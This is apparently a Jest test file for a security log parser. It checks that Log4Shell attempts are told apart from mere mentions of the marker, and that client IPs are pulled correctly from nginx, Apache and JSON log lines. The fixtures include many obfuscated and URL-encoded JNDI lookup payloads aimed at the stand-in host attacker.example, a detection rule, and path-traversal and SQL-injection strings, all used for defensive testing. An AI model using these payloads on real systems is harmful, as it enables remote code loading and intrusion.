import { describe, expect, test } from "@jest/globals";
import NormalizedSecurityEvent from "../../../../Types/SecurityEvent/NormalizedSecurityEvent";
import WebAttackLogParser, {
  CLIENT_ADDRESS_LABELS,
  WEB_ATTACK_PAYLOAD_ATTRIBUTE,
  WebAttackKind,
  readAddressToken,
  readAttackPayload,
  readClientAddress,
  readWebAttackKind,
} from "../../../../Utils/SecurityEvent/LogParsers/WebAttackLogParser";
import { FastestRun, fastestRun } from "../../../Helpers/FastestRun";
import { generatedTexts } from "../../../Helpers/GeneratedTexts";
import { WEB_LINES, logLine } from "./LogParserFixtures";

/*
 * Issue #6419, read from the request parser's side. ClickHouse's line for
 * the log scan's own query held the scan's words - "'${jndi:', '%24%7bjndi'"
 * - and the server's version, and became "Log4Shell exploit attempt" from
 * 26.7.38.18. Two readings made that: the marker counted wherever it was,
 * though nothing was looked up after it, and the client was the first word
 * anywhere in the line that read as an address. Now a Log4Shell attempt is
 * a lookup - the marker, then a name to look up - and the client is the
 * line's first word or the address after a word that names one.
 */

function parseOne(body: string): NormalizedSecurityEvent {
  const events: Array<NormalizedSecurityEvent> = WebAttackLogParser.parse(
    logLine(body),
  );

  expect(events).toHaveLength(1);

  return events[0]!;
}

// Lookups attackers sent in 2021 and since, as servers logged them.
const LOOKUPS: ReadonlyArray<string> = [
  "${jndi:ldap://attacker.example/a}",
  "${jndi:ldaps://attacker.example/a}",
  "${jndi:rmi://attacker.example:1099/a}",
  "${jndi:dns://attacker.example/a}",
  "${jndi:iiop://attacker.example/a}",
  "${jndi:http://attacker.example/a}",
  "${jndi:nis://attacker.example/a}",
  "${jndi:corba://attacker.example/a}",
  "${JNDI:LDAP://attacker.example/a}",
  "${jndi:ldap://127.0.0.1#attacker.example:1389/a}",
  "${jndi:${lower:l}${lower:d}a${lower:p}://attacker.example/a}",
  "${jndi:${upper:L}DAP://attacker.example/a}",
  "${jndi:${::-l}${::-d}${::-a}${::-p}://attacker.example/a}",
  "${jndi:${env:NaN:-l}dap://attacker.example/a}",
  "${jndi:\\u006cdap://attacker.example/a}",
  "${jndi:%6cdap://attacker.example/a}",
  "${jndi:1dap://attacker.example/a}",
  "%24%7Bjndi:ldap://attacker.example/a%7D",
  "%24%7Bjndi%3Aldap%3A%2F%2Fattacker.example%2Fa%7D",
  "%24%7bjndi%3aldap%3a%2f%2fattacker.example%2fa%7d",
  "%24%7Bjndi%3A%24%7Blower%3Al%7Ddap%3A%2F%2Fattacker.example%2Fa%7D",
  "%24%7Bjndi%3A%6Cdap%3A%2F%2Fattacker.example%2Fa%7D",
];

// The string named, not used: a scan's words, a rule, a query, a page about it.
const NAMINGS: ReadonlyArray<string> = [
  "'${jndi:'",
  '"${jndi:"',
  "${jndi:",
  "${jndi:}",
  "${jndi:,",
  "${jndi:)",
  "${jndi:]",
  "${jndi: ldap://attacker.example/a}",
  "${jndi:'ldap'",
  "${jndi:%27",
  "${jndi:%20ldap",
  "${jndi:-",
  "'%24%7bjndi'",
  "%24%7bjndi",
  "%24%7bjndi:",
  "%24%7bjndi%3a",
  "%24%7bjndi%3a'",
  "%24%7bjndi%3a%27",
  "%24%7bjndi%3a%2c",
  "%24%7bjndiX",
  "%24%7bjndi%3",
  "%24%7bjndi%3a%zz",
  "multiSearchAnyCaseInsensitive(body, ['${jndi:', '%24%7bjndi'])",
  "body ILIKE '%${jndi:%'",
  "title: Log4Shell exploit attempt - detection: selection: target|contains: ['${jndi:', '%24%7bjndi']",
];

describe("a Log4Shell attempt is a lookup", () => {
  test.each(LOOKUPS)("%s looks a name up", (lookup: string) => {
    expect(readWebAttackKind(`GET /?x=${lookup}`)).toBe(
      WebAttackKind.Log4Shell,
    );
    expect(readWebAttackKind(`X-Api-Version: ${lookup}`)).toBe(
      WebAttackKind.Log4Shell,
    );
  });

  test.each(NAMINGS)("%s only names the string", (naming: string) => {
    expect(readWebAttackKind(naming)).toBeNull();
    expect(
      readWebAttackKind(`search for ${naming} in the last hour`),
    ).toBeNull();
    expect(WebAttackLogParser.parse(logLine(naming))).toEqual([]);
  });

  test("a line that names the string and then uses it is the attempt it holds", () => {
    const line: string =
      "WARN WAF rule '${jndi:' matched header X-Api-Version=${jndi:ldap://attacker.example/x} from 203.0.113.44";

    expect(readWebAttackKind(line)).toBe(WebAttackKind.Log4Shell);
    // The payload is the lookup, not the rule's words before it.
    expect(readAttackPayload(line, WebAttackKind.Log4Shell)).toBe(
      "X-Api-Version=${jndi:ldap://attacker.example/x}",
    );

    const event: NormalizedSecurityEvent = parseOne(line);

    expect(event.principalIp).toBe("203.0.113.44");
    expect(event.message.startsWith("Log4Shell exploit attempt")).toBe(true);
    expect(JSON.stringify(event)).toContain("ldap://attacker.example/x");
    expect(
      event.attributes[WEB_ATTACK_PAYLOAD_ATTRIBUTE] || event.targetResource,
    ).toContain("${jndi:ldap://attacker.example/x}");
  });

  test("an encoded naming, then an encoded lookup", () => {
    const line: string =
      '203.0.113.44 - - [09/Nov/2026:13:04:23 +0000] "GET /search?q=%24%7bjndi&h=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.example%2Fa%7D HTTP/1.1" 404 0 "-" "curl/8.5.0"';

    expect(readAttackPayload(line, WebAttackKind.Log4Shell)).toBe(
      "/search?q=%24%7bjndi&h=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.example%2Fa%7D",
    );
    expect(parseOne(line).principalIp).toBe("203.0.113.44");
  });

  test("the application log fixture is still an attempt", () => {
    const event: NormalizedSecurityEvent = parseOne(
      WEB_LINES.log4ShellInApplicationLog,
    );

    expect(event.principalIp).toBe("203.0.113.44");
  });

  test("other attacks are read as before, beside a naming of the string", () => {
    expect(
      readWebAttackKind("q='${jndi:' union select password from users"),
    ).toBe(WebAttackKind.SqlInjection);
    expect(readWebAttackKind("'%24%7bjndi' ../../etc/passwd")).toBe(
      WebAttackKind.PathTraversal,
    );
  });

  test("any text made of namings stays no attempt, and a lookup anywhere in it makes one", () => {
    /*
     * Each piece ends where a name could not start: two namings glued
     * together ("%24%7bjndi%3a" then "title") spell a lookup themselves.
     */
    const alphabet: ReadonlyArray<string> = [
      ...NAMINGS.map((naming: string): string => {
        return `${naming} `;
      }),
      " ",
      "'",
      ",",
      "}",
      ")",
      "% ",
      "%3 ",
      ": ",
      "union ",
    ];

    for (const text of generatedTexts(1500, 6419, alphabet, 6)) {
      expect({ text, kind: readWebAttackKind(text) }).toEqual({
        text,
        kind: null,
      });

      const withLookup: string = `${text}${LOOKUPS[text.length % LOOKUPS.length]!}`;

      expect({ withLookup, kind: readWebAttackKind(withLookup) }).toEqual({
        withLookup,
        kind: WebAttackKind.Log4Shell,
      });
    }
  });

  test("400,000 characters of markers that never look anything up take time in line with them", () => {
    const texts: ReadonlyArray<string> = [
      "${jndi:'".repeat(50000),
      "%24%7bjndi%3a'".repeat(28572),
      "%24%7bjndi%3".repeat(33333),
      "${jndi:,".repeat(50000),
      "${jndi:%".repeat(50000),
    ];

    const run: FastestRun<number> = fastestRun({
      run: (): number => {
        let read: number = 0;

        for (const text of texts) {
          read += readWebAttackKind(text) ? 1 : 0;
          read += readAttackPayload(text, WebAttackKind.Log4Shell) ? 1 : 0;
        }

        return read;
      },
      limitInMs: 2000,
    });

    expect(run.inMs).toBeLessThan(2000);
    expect(run.result).toBe(0);
  });
});

describe("the client of a line in no known format", () => {
  test("is never the version a server prints (issue #6419)", () => {
    for (const line of [
      "ClickHouse 26.7.38.18 error: ${jndi:ldap://attacker.example/x}",
      "Code: 241. (MEMORY_LIMIT_EXCEEDED) (version 26.7.38.18 (official build)) union select 1",
      "nginx/1.27.3.4 rejected /?x=../../etc/passwd",
      "v10.20.30.40 build ${jndi:ldap://attacker.example/x}",
      "release 2026.11.09.1 shipped with ../../etc/passwd in a test",
    ]) {
      expect({ line, ip: readClientAddress(line) }).toEqual({ line, ip: "" });
    }
  });

  test("is the address after a word that names one", () => {
    const cases: ReadonlyArray<[string, string]> = [
      // nginx's error log.
      [
        '2026/11/09 13:10:14 [error] 88#88: *1 open() "/usr/share/nginx/html/../../etc/passwd" failed (2: No such file or directory), client: 203.0.113.7, server: localhost, request: "GET /../../etc/passwd HTTP/1.1", host: "localhost"',
        "203.0.113.7",
      ],
      // Apache's error log, a port after the address.
      [
        "[Sun Nov 09 13:10:14.575 2026] [core:error] [pid 88] [client 203.0.113.8:51234] AH00126: Invalid URI in request GET /..%2f..%2fetc/passwd HTTP/1.1",
        "203.0.113.8",
      ],
      ['level=warn remote_addr=203.0.113.9 msg="\' or 1=1"', "203.0.113.9"],
      ["level=warn src=203.0.113.10 msg=../../etc/passwd", "203.0.113.10"],
      ["level=warn ip=203.0.113.11 msg=../../etc/passwd", "203.0.113.11"],
      ["level=warn client.address=203.0.113.12 q=union select", "203.0.113.12"],
      ["level=warn source.ip=203.0.113.13 q=union select", "203.0.113.13"],
      [
        'request {"client_ip":"203.0.113.14","path":"/?x=${jndi:ldap://attacker.example/a}"}',
        "203.0.113.14",
      ],
      [
        "request {'remote_ip': '203.0.113.15', 'q': 'union select'}",
        "203.0.113.15",
      ],
      // An application's own words.
      ["WARN rejected ../../etc/passwd from 203.0.113.16.", "203.0.113.16"],
      ["WARN rejected ../../etc/passwd From: 203.0.113.17", "203.0.113.17"],
      // A bracketed IPv6 address with its port, an IPv4 address written as IPv6.
      ["WARN union select from [2001:db8::7]:443", "2001:db8::7"],
      ["WARN union select from 2001:db8::8", "2001:db8::8"],
      ["WARN union select (from [::ffff:203.0.113.18]:44220)", "203.0.113.18"],
      ["WARN union select from ::ffff:203.0.113.19", "203.0.113.19"],
      // Node's remoteAddress, after a colon or in JSON.
      ["WARN union select from: ::ffff:203.0.113.34", "203.0.113.34"],
      ['{"msg":"union select","ip":"::ffff:203.0.113.35"}', "203.0.113.35"],
      ["WARN union select client=::ffff:203.0.113.36", "203.0.113.36"],
    ];

    for (const [line, ip] of cases) {
      expect({ line, ip: readClientAddress(line) }).toEqual({ line, ip });
    }
  });

  test("is the line's first word when that is an address", () => {
    expect(readClientAddress("203.0.113.20 GET /?x=../../etc/passwd")).toBe(
      "203.0.113.20",
    );
    expect(readClientAddress("203.0.113.21:51234 GET /?x=union select")).toBe(
      "203.0.113.21",
    );
    expect(readClientAddress("[2001:db8::22]:443 GET /?x=union select")).toBe(
      "2001:db8::22",
    );
    expect(readClientAddress("::ffff:203.0.113.23 - - GET /../../")).toBe(
      "203.0.113.23",
    );
    // The first word wins over a label later in the line.
    expect(readClientAddress("203.0.113.24 GET /?x=1 from 198.51.100.1")).toBe(
      "203.0.113.24",
    );
  });

  test("takes the most telling label first, and looks past one with no address after it", () => {
    expect(
      readClientAddress(
        "WARN from 198.51.100.1 client: 203.0.113.25 union select",
      ),
    ).toBe("203.0.113.25");
    expect(
      readClientAddress("WARN request from the api failed, from 203.0.113.26"),
    ).toBe("203.0.113.26");
    expect(
      readClientAddress("WARN ip= nothing, ip=203.0.113.27 union select"),
    ).toBe("203.0.113.27");
  });

  test("is never what a request said about itself", () => {
    for (const line of [
      // A forwarded-for header is whatever the sender wrote.
      "WARN X-Forwarded-For=198.51.100.9 X-Api-Version=${jndi:ldap://attacker.example/x}",
      "WARN x-forwarded-for: 198.51.100.9, 10.0.0.1 path=/../../etc/passwd",
      "WARN X-Real-IP: 198.51.100.9 union select",
      "WARN x_real_ip=198.51.100.9 union select",
      "WARN X-Client-IP: 198.51.100.9 union select",
      "WARN realip=198.51.100.9 union select",
      "WARN forwarded=for=198.51.100.9 union select",
      // Words that only end with a label.
      "WARN zip=198.51.100.9 union select",
      "WARN skip 198.51.100.9 union select",
      "WARN airship:198.51.100.9 union select",
      "WARN subclient=198.51.100.9 union select",
      "WARN datasource=198.51.100.9 union select",
      // Loopback, "any" and no address at all.
      "WARN from 127.0.0.1 union select",
      "WARN from ::1 union select",
      "WARN from 0.0.0.0 union select",
      "WARN from 300.1.1.1 union select",
      "WARN from host.example union select",
      "WARN from [2001:db8::7 union select",
      `WARN from ${"1".repeat(80)} union select`,
    ]) {
      expect({ line, ip: readClientAddress(line) }).toEqual({ line, ip: "" });
    }
  });

  test("an address token is read without what is around it", () => {
    expect(readAddressToken("203.0.113.30")).toBe("203.0.113.30");
    expect(readAddressToken("203.0.113.30:443")).toBe("203.0.113.30");
    expect(readAddressToken("203.0.113.30.")).toBe("203.0.113.30");
    expect(readAddressToken("[2001:db8::30]:443")).toBe("2001:db8::30");
    expect(readAddressToken("[2001:db8::30]")).toBe("2001:db8::30");
    expect(readAddressToken("2001:db8::30")).toBe("2001:db8::30");
    expect(readAddressToken("[::ffff:203.0.113.30]:1")).toBe("203.0.113.30");
    expect(readAddressToken("26.7.38.18.1")).toBe("");
    expect(readAddressToken("127.0.0.1:8123")).toBe("");
    expect(readAddressToken("")).toBe("");
    expect(readAddressToken("[")).toBe("");
  });

  test("every label is a word of its own, matched without case", () => {
    for (const label of CLIENT_ADDRESS_LABELS) {
      expect(readClientAddress(`WARN ${label}=203.0.113.31 union select`)).toBe(
        "203.0.113.31",
      );
      expect(
        readClientAddress(
          `WARN ${label.toUpperCase()}: 203.0.113.32 union select`,
        ),
      ).toBe("203.0.113.32");
      expect(
        readClientAddress(`WARN x${label}=203.0.113.33 union select`),
      ).toBe("");
    }
  });

  test("400,000 characters of labels take time in line with them", () => {
    const texts: ReadonlyArray<string> = [
      "from ".repeat(80000),
      "from [".repeat(66666),
      "ip=".repeat(133333),
      `from ${"[".repeat(400000)}`,
      `client: ${"1".repeat(400000)}`,
      CLIENT_ADDRESS_LABELS.join(" x ").repeat(1500),
    ];

    const run: FastestRun<number> = fastestRun({
      run: (): number => {
        let read: number = 0;

        for (const text of texts) {
          read += readClientAddress(text) ? 1 : 0;
        }

        return read;
      },
      limitInMs: 2000,
    });

    expect(run.inMs).toBeLessThan(2000);
    expect(run.result).toBe(0);
  });
});
